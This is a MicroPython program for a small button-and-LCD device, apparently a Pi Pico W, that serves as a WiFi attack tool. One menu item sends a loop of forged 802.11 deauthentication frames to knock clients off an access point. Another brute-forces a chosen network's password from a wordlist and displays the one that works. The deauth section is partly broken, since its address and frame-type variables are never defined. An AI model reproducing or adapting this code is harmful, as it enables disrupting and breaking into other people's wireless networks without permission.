from machine import Pin, SoftSPI, I2C
import time
from I2C_LCD import I2CLcd
import network
import usocket
import micropython
from settings import settings_module


class wifi_module(object):
	global lastdisplay2
	lastdisplay2=""
	
	def __init__(self):
		self.button_up = Pin(20, Pin.IN, Pin.PULL_UP)	 
		self.button_ok = Pin(19, Pin.IN, Pin.PULL_UP)	
		self.button_down = Pin(18, Pin.IN, Pin.PULL_UP)
	
	def __start__(self):
		menu=0
		self.button_up = Pin(20, Pin.IN, Pin.PULL_UP)	 
		self.button_ok = Pin(19, Pin.IN, Pin.PULL_UP)	
		self.button_down = Pin(18, Pin.IN, Pin.PULL_UP)
		i2c = I2C(0, sda=Pin(16), scl=Pin(17), freq=400000)
		devices = i2c.scan()
		self.lcd = I2CLcd(i2c, 0x3f, 2, 16)
		self.lcd.clear()
		
		self.display(self,"WIFI", 0, True)
		self.updatemenu(self, menu)
		
		while True:
			if not self.button_up.value() and not menu==0:
				menu=menu-1
				self.updatemenu(self, menu)
				while not self.button_up.value():
					time.sleep(0)
			if not self.button_down.value() and not menu==2:
				menu=menu+1
				self.updatemenu(self, menu)
				while not self.button_down.value():
					time.sleep(0)
			if not self.button_ok.value():
				self.selectoption(self, menu)
				while not self.button_ok.value():
					time.sleep(0)
		return
	
	def updatemenu(self, menu):
		if menu == -1:
			menu = 0
		if menu == 0:
			self.display(self," > Kill wifi    ", 1)
		if menu == 1:
			self.display(self," > Find wifi pwd", 1)
		if menu == 2:
			self.display(self," > other        ", 1)
		if menu == 3:
			menu = 4
	
	def selectoption(self, menu):
		if menu == 0:
			self.lcd.clear()
			self.display(self,"Deauth", 0, True)
			self.display(self,"press ok to stop", 1)
			while True:
				_ap
				_client
				type
				reason=""
				sta_if=network.WLAN(network.STA_IF)
				packet=bytearray([0xC0,0x00,0x00,0x00,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,0x00, 0x00,0x01, 0x00])
				for i in range(0,6):
					packet[4 + i] =_client[i]
					packet[10 + i] = packet[16 + i] =_ap[i]
				packet[0] = type;
				packet[24] = reason
				result=sta_if.freedom(packet)
				if result==0:
					time.sleep(0.01)
				if not self.button_ok.value():
					break
		if menu == 1:
			self.lcd.clear()
			self.display(self,"Find wifi pwd", 0, True)
			a=0
			totaltry="500"
			
			
			sta_if = network.WLAN(network.STA_IF)
			#ap_if.disconnect()
			#ap_if.active(False)
			sta_if.active(True)
			
			
			networks=sta_if.scan()
			
			networks_list = []
			
			for ap in networks:
				if not ap[5] == 0:
					networks_list.append(str(ap[0]).replace("b'", "").replace("'", ""))
				#print("BSSID: "+str(ap[1]))
				#print("Channel: "+str(ap[2]))
				#print("RSSI: "+str(ap[3]))
				#print("Security: "+str(ap[4]))
			
			selectedSSID=""
			if len(networks_list) > 0:
				self.display(self,"  Select  WIFI  >"+networks_list[0][0:15], 0)
				menu3=1
				while True:
					if not self.button_down.value() and not menu3==len(networks_list):
						menu3=menu3+1
						self.display(self,"  Select  WIFI   > "+networks_list[menu3-1][0:15], 0)
					if not self.button_up.value() and not menu3==1:
						menu3=menu3-1
						self.display(self,"  Select  WIFI   > "+networks_list[menu3-1][0:15], 0)
					if not self.button_ok.value():
						selectedSSID=networks_list[menu3-1]
						break
				print("Selected SSID: "+selectedSSID)
			else:
				self.display(self,"No wifi avaiable", 0)
				time.sleep(1)
			
			
			
			password="error"
			
			with open(settings_module.getSetting("password_list"), "r") as fp:
				password=fp.read().split("\r\n")
			totaltry=len(password)
			sta_if.disconnect()
			time.sleep(2)
			for a in range(len(password)):
				print(str(a)+"/"+str(len(password)))
				
				self.display(self,"                ", 1)
				lenghta=16-len("["+str(a)+"/"+str(totaltry)+"] ")
				self.display(self,"["+str(a)+"/"+str(totaltry)+"] "+password[a][0:lenghta], 1)
				
				try:
					if sta_if.isconnected():
						sta_if.disconnect()
						print("Already connected to network")
						time.sleep(2)
						
					
					sta_if.connect(selectedSSID, password[a])
					time.sleep(3)
					if sta_if.isconnected() and not sta_if.status() == 1:
						self.display(self,"                ", 1)
						self.display(self,"pwd: "+password[a], 1)
						while True:
							if not self.button_ok.value():
								break
						break
					print("status: "+str(sta_if.status()))
				except Exception as e:
					self.display(self,"Can't reach wifi", 1)
					print(e)
					break
				if not self.button_ok.value():
					break
			
			#ap_if.active(True)
			sta_if.active(False)
			return
		if menu == 2:
			self.lcd.clear()
			self.display(self,"uwu2 ", 0)
			self.display(self,"uwu2 ", 1)
			
	def display(self, text, line, middle=False, lastdisplay=lastdisplay2):
		if middle:
			self.lcd.move_to(int(8-len(text)/2), line)
		else:
			self.lcd.move_to(0, line)
		if text!=lastdisplay:
			self.lcd.putstr(text)
		lastdisplay=text
